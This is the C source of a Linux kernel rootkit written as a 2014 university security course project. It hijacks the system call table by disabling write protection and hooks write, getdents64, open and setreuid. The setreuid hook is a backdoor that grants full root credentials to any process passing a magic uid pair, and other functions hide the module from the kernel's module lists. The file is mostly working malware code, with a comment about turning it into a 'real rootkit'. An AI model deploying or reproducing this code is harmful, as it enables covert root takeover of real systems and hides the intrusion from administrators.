/**********************************************************
	Last Updated: Nov 1, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description
		main function 
		device registration
		syscall table hijacking
***********************************************************/

#include "../headers/all.h"

/* 
	Get system call table address from System.map
		$ sudo cat /boot/System.map-`uname -r` | grep sys_call_table
		ffffffff81801300 R sys_call_table
	The following command will not work in kernel 3.x
		$ sudo cat /proc/kallsyms | grep sys_call_table
		0000000000000000 R sys_call_table
*/
void **sys_call_table = (void *)0xffffffff81801300;
//static unsigned long *sys_call_table = (unsigned long *) 0xffffffff81801300;

// Get the addresses of the original system calls
asmlinkage long (*original_write)(unsigned int, const char*, size_t);
asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64*, unsigned int);
asmlinkage long (*original_setreuid)(uid_t, uid_t);
asmlinkage long (*original_open) (const char*, int, int);

// Extern symbols here:
extern char rk_buf[BUFLEN];
extern int is_open;
extern struct miscdevice kcr;
extern asmlinkage int my_getdents(unsigned int, struct linux_dirent64*, unsigned int);

static struct list_head *saved_modulle_head;

/*By Chen
 *
 * in buf special types: 4B + 8B_prifix+ strlen(TARGET)+4B_surfix + 2B(white space) 
 *
 * */
asmlinkage long 
my_write(unsigned int fd, const char *buf, size_t nbyte){	
	//char *index1, *index2;
	//char *hide_str = "test";
	//bool is_special = 1;
//	char *str2 = "flush.sh";
	if(fd == 1){
		
//		if(index1 = strstr(buf, hide_str)){
//			return -1;
//			index2 = strstr(buf, str2);
/*
			int offset = is_special?strlen(hide_str) +4+2:strlen(hide_str)+2;
			printk("target len %d, test ahead : %s\n ", strlen(hide_str),  index1-8);
			if(is_special)
				memcpy(index1-8, index1+offset, strlen(index1+offset));
			else
				memcpy(index1, index1+offset, strlen(index1+offset));
				*/
//		}
	}	
	return original_write(fd, buf, nbyte);
}

/* BACKDOOR by Koo: 
 *
 * If a certain set of (ruid/euid) is configured to a normal program with a user privilege, 
 * it will obtain a root privilege with this backdoor at once
 *
 * */
asmlinkage long
my_setreuid(uid_t ruid, uid_t euid) {
	// Hooking a certain condition below
	if( (ruid == 1234) && (euid == 5678) ) {
		struct cred *credential = prepare_creds();

		// Set the permission of the current process to root
		credential -> uid = 0;
		credential -> gid = 0;
		credential -> euid = 0;
		credential -> egid = 0;
		credential -> suid = 0;
		credential -> sgid = 0;
		credential -> fsuid = 0;
		credential -> fsgid = 0;
		
		return commit_creds(credential);
	}
	
	// Otherwise just call original function
	return original_setreuid(ruid, euid);
}

/* Koo: 
 *
 * Checking if the target is open 
 *
 * */
asmlinkage long
my_open(const char* file, int flags, int mode) {
	const char* target = "kcr.c";
	if (strncmp(target, file, strlen(file)) == 0)
		printk(KERN_INFO "Target detected!\n");
	return original_open(file, flags, mode);
}

/* Koo: 
 *
 * Hiding/Unhiding the module itself
 *		<linux/list.h>
 * 			list_del_init(struct list_head *entry)
 *			list_add(struct list_head *new, struct list_head *head)
 * */
void hiding_module(void) {
	saved_modulle_head = THIS_MODULE->list.prev;

	// Remove this module from the module list and kobject list
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Module successully hidden!\n");
}

void unhiding_module(void) {
	// Add this module to the module list
	list_add(&THIS_MODULE->list, saved_modulle_head);
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Module successully revealed!\n");
}

// Entry function for kernel module initialization
int 
__init init_mod(void) {
	
	if (DEBUG == 1) {
		printk(KERN_ALERT "Entering hooking module!\n");
		printk(KERN_INFO "This process is \"%s\" (pid %i)\n", current->comm, current->pid);
	}
	
	misc_register(&kcr);
	
	// Get original system call addr in asm/unistd.h
	original_write = sys_call_table[__NR_write];			// __NR_write 64
	original_getdents = sys_call_table[__NR_getdents64];	// __NR_getdents64 61
	original_setreuid = sys_call_table[__NR_setreuid];		// __NR_setreuid 145
	original_open = sys_call_table[__NR_open];				// __NR_open 1024
	
	// Set system call table to be writable by changing cr0 register
	PROT_DISABLE;
	
	// Overwrite manipulated system calls
	sys_call_table[__NR_write] = my_write;
	sys_call_table[__NR_getdents64] = my_getdents;
	sys_call_table[__NR_setreuid] = my_setreuid;
	sys_call_table[__NR_open] = my_open;
	
	if (DEBUG == 1) {
		printk(KERN_INFO "Original/Hooked syscall for write(): 0x%p / 0x%p\n", 
			(void*)original_write, (void*)my_write);
		printk(KERN_INFO "Original/Hooked syscall for getdents(): 0x%p / 0x%p\n", 
			(void*)original_getdents, (void*)my_getdents);
		printk(KERN_INFO "Original/Hooked syscall for setreuid(): 0x%p / 0x%p\n", 
			(void*)original_setreuid, (void*)my_setreuid);
		printk(KERN_INFO "Original/Hooked syscall for open(): 0x%p / 0x%p\n", 
			(void*)original_open, (void*)my_open);
	}
	
	//Changing the control bit back
	PROT_ENABLE;
	
	//hiding_module();
	//unhiding_module();
	
	return 0;
}

// Exit function for kernel module termination
void
__exit exit_mod(void){
	
	 misc_deregister(&kcr);
	 
	// Restore all system calls to the original ones
	PROT_DISABLE;
	sys_call_table[__NR_write] = original_write;
	sys_call_table[__NR_getdents64] = original_getdents;
	sys_call_table[__NR_setreuid] = original_setreuid;
	sys_call_table[__NR_open] = original_open;
	PROT_ENABLE;
	
	if (DEBUG == 1) {
		printk(KERN_ALERT "Exiting hooking module!\n");
	}

}

module_init(init_mod);
module_exit(exit_mod);

/* 
	GENERAL INFORMATION ABOUT THE KERNEL MODULE
	THIS PART SHOULD BE REMOVED IN REAL ROOTKIT! :)
*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("hykoo & yaohchen");
MODULE_DESCRIPTION("CSE509-PJT");
MODULE_VERSION("0.1");
MODULE_SUPPORTED_DEVICE("Tested with kernel 3.2.0-29-generic in Ubuntu")